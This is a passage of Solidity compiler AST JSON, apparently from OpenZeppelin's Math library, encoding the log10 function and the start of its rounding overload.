Math.Rounding"}},"visibility":"internal"}],"src":"28781:34:6"},"returnParameters":{"id":3365,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3364,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3389,"src":"28839:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3363,"name":"uint256","nodeType":"ElementaryTypeName","src":"28839:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"28838:9:6"},"scope":3686,"src":"28768:255:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3517,"nodeType":"Block","src":"29216:854:6","statements":[{"assignments":[3398],"declarations":[{"constant":false,"id":3398,"mutability":"mutable","name":"result","nameLocation":"29234:6:6","nodeType":"VariableDeclaration","scope":3517,"src":"29226:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3397,"name":"uint256","nodeType":"ElementaryTypeName","src":"29226:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":3400,"initialValue":{"hexValue":"30","id":3399,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29243:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"29226:18:6"},{"id":3514,"nodeType":"UncheckedBlock","src":"29254:787:6","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3405,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3401,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29282:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_10000000000000000000000000000000000000000000000000000000000000000_by_1","typeString":"int_const 1000...(57 digits omitted)...0000"},"id":3404,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3402,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29291:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3634","id":3403,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29297:2:6","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"29291:8:6","typeDescriptions":{"typeIdentifier":"t_rational_10000000000000000000000000000000000000000000000000000000000000000_by_1","typeString":"int_const 1000...(57 digits omitted)...0000"}},"src":"29282:17:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3417,"nodeType":"IfStatement","src":"29278:103:6","trueBody":{"id":3416,"nodeType":"Block","src":"29301:80:6","statements":[{"expression":{"id":3410,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3406,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29319:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_10000000000000000000000000000000000000000000000000000000000000000_by_1","typeString":"int_const 1000...(57 digits omitted)...0000"},"id":3409,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3407,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29328:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3634","id":3408,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29334:2:6","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"29328:8:6","typeDescriptions":{"typeIdentifier":"t_rational_10000000000000000000000000000000000000000000000000000000000000000_by_1","typeString":"int_const 1000...(57 digits omitted)...0000"}},"src":"29319:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3411,"nodeType":"ExpressionStatement","src":"29319:17:6"},{"expression":{"id":3414,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3412,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3398,"src":"29354:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3634","id":3413,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29364:2:6","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"29354:12:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3415,"nodeType":"ExpressionStatement","src":"29354:12:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3422,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3418,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29398:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_100000000000000000000000000000000_by_1","typeString":"int_const 1000...(25 digits omitted)...0000"},"id":3421,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3419,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29407:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3332","id":3420,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29413:2:6","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"29407:8:6","typeDescriptions":{"typeIdentifier":"t_rational_100000000000000000000000000000000_by_1","typeString":"int_const 1000...(25 digits omitted)...0000"}},"src":"29398:17:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3434,"nodeType":"IfStatement","src":"29394:103:6","trueBody":{"id":3433,"nodeType":"Block","src":"29417:80:6","statements":[{"expression":{"id":3427,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3423,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29435:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_100000000000000000000000000000000_by_1","typeString":"int_const 1000...(25 digits omitted)...0000"},"id":3426,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3424,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29444:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3332","id":3425,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29450:2:6","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"29444:8:6","typeDescriptions":{"typeIdentifier":"t_rational_100000000000000000000000000000000_by_1","typeString":"int_const 1000...(25 digits omitted)...0000"}},"src":"29435:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3428,"nodeType":"ExpressionStatement","src":"29435:17:6"},{"expression":{"id":3431,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3429,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3398,"src":"29470:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3332","id":3430,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29480:2:6","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"29470:12:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3432,"nodeType":"ExpressionStatement","src":"29470:12:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3439,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3435,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29514:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_10000000000000000_by_1","typeString":"int_const 10000000000000000"},"id":3438,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3436,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29523:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3136","id":3437,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29529:2:6","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"29523:8:6","typeDescriptions":{"typeIdentifier":"t_rational_10000000000000000_by_1","typeString":"int_const 10000000000000000"}},"src":"29514:17:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3451,"nodeType":"IfStatement","src":"29510:103:6","trueBody":{"id":3450,"nodeType":"Block","src":"29533:80:6","statements":[{"expression":{"id":3444,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3440,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29551:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_10000000000000000_by_1","typeString":"int_const 10000000000000000"},"id":3443,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3441,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29560:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3136","id":3442,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29566:2:6","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"29560:8:6","typeDescriptions":{"typeIdentifier":"t_rational_10000000000000000_by_1","typeString":"int_const 10000000000000000"}},"src":"29551:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3445,"nodeType":"ExpressionStatement","src":"29551:17:6"},{"expression":{"id":3448,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3446,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3398,"src":"29586:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3136","id":3447,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29596:2:6","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"29586:12:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3449,"nodeType":"ExpressionStatement","src":"29586:12:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3456,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3452,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29630:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_100000000_by_1","typeString":"int_const 100000000"},"id":3455,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3453,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29639:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"38","id":3454,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29645:1:6","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"29639:7:6","typeDescriptions":{"typeIdentifier":"t_rational_100000000_by_1","typeString":"int_const 100000000"}},"src":"29630:16:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3468,"nodeType":"IfStatement","src":"29626:100:6","trueBody":{"id":3467,"nodeType":"Block","src":"29648:78:6","statements":[{"expression":{"id":3461,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3457,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29666:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_100000000_by_1","typeString":"int_const 100000000"},"id":3460,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3458,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29675:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"38","id":3459,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29681:1:6","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"29675:7:6","typeDescriptions":{"typeIdentifier":"t_rational_100000000_by_1","typeString":"int_const 100000000"}},"src":"29666:16:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3462,"nodeType":"ExpressionStatement","src":"29666:16:6"},{"expression":{"id":3465,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3463,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3398,"src":"29700:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"38","id":3464,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29710:1:6","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"29700:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3466,"nodeType":"ExpressionStatement","src":"29700:11:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3473,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3469,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29743:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_10000_by_1","typeString":"int_const 10000"},"id":3472,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3470,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29752:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"34","id":3471,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29758:1:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"29752:7:6","typeDescriptions":{"typeIdentifier":"t_rational_10000_by_1","typeString":"int_const 10000"}},"src":"29743:16:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3485,"nodeType":"IfStatement","src":"29739:100:6","trueBody":{"id":3484,"nodeType":"Block","src":"29761:78:6","statements":[{"expression":{"id":3478,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3474,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29779:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_10000_by_1","typeString":"int_const 10000"},"id":3477,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3475,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29788:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"34","id":3476,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29794:1:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"29788:7:6","typeDescriptions":{"typeIdentifier":"t_rational_10000_by_1","typeString":"int_const 10000"}},"src":"29779:16:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3479,"nodeType":"ExpressionStatement","src":"29779:16:6"},{"expression":{"id":3482,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3480,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3398,"src":"29813:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"34","id":3481,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29823:1:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"29813:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3483,"nodeType":"ExpressionStatement","src":"29813:11:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3490,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3486,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29856:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_100_by_1","typeString":"int_const 100"},"id":3489,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3487,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29865:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"32","id":3488,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29871:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"29865:7:6","typeDescriptions":{"typeIdentifier":"t_rational_100_by_1","typeString":"int_const 100"}},"src":"29856:16:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3502,"nodeType":"IfStatement","src":"29852:100:6","trueBody":{"id":3501,"nodeType":"Block","src":"29874:78:6","statements":[{"expression":{"id":3495,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3491,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29892:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_100_by_1","typeString":"int_const 100"},"id":3494,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3492,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29901:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"32","id":3493,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29907:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"29901:7:6","typeDescriptions":{"typeIdentifier":"t_rational_100_by_1","typeString":"int_const 100"}},"src":"29892:16:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3496,"nodeType":"ExpressionStatement","src":"29892:16:6"},{"expression":{"id":3499,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3497,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3398,"src":"29926:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"32","id":3498,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29936:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"29926:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3500,"nodeType":"ExpressionStatement","src":"29926:11:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3507,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3503,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3392,"src":"29969:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"id":3506,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3504,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29978:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"31","id":3505,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29984:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"29978:7:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"}},"src":"29969:16:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3513,"nodeType":"IfStatement","src":"29965:66:6","trueBody":{"id":3512,"nodeType":"Block","src":"29987:44:6","statements":[{"expression":{"id":3510,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3508,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3398,"src":"30005:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"31","id":3509,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"30015:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"30005:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3511,"nodeType":"ExpressionStatement","src":"30005:11:6"}]}}]},{"expression":{"id":3515,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3398,"src":"30057:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3396,"id":3516,"nodeType":"Return","src":"30050:13:6"}]},"documentation":{"id":3390,"nodeType":"StructuredDocumentation","src":"29029:120:6","text":" @dev Return the log in base 10 of a positive value rounded towards zero.\n Returns 0 if given 0."},"id":3518,"implemented":true,"kind":"function","modifiers":[],"name":"log10","nameLocation":"29163:5:6","nodeType":"FunctionDefinition","parameters":{"id":3393,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3392,"mutability":"mutable","name":"value","nameLocation":"29177:5:6","nodeType":"VariableDeclaration","scope":3518,"src":"29169:13:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3391,"name":"uint256","nodeType":"ElementaryTypeName","src":"29169:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"29168:15:6"},"returnParameters":{"id":3396,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3395,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3518,"src":"29207:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3394,"name":"uint256","nodeType":"ElementaryTypeName","src":"29207:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"29206:9:6"},"scope":3686,"src":"29154:916:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3551,"nodeType":"Block","src":"30305:177:6","statements":[{"id":3550,"nodeType":"UncheckedBlock","src":"30315:161:6","statements":[{"assignments":[3530],"declarations":[{"constant":false,"id":3530,"mutability":"mutable","name":"result","nameLocation":"30347:6:6","nodeType":"VariableDeclaration","scope":3550,"src":"30339:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3529,"name":"uint256","nodeType":"ElementaryTypeName","src":"30339:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":3534,"initialValue":{"arguments":[{"id":3532,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3521,"src":"30362:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3531,"name":"log10","nodeType":"Identifier","overloadedDeclarations":[3518,3552],"referencedDeclaration":3518,"src":"30356:5:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":3533,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"30356:12:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"30339:29:6"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3548,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3535,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3530,"src":"30389:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":3546,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":3539,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3524,"src":"30431:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum 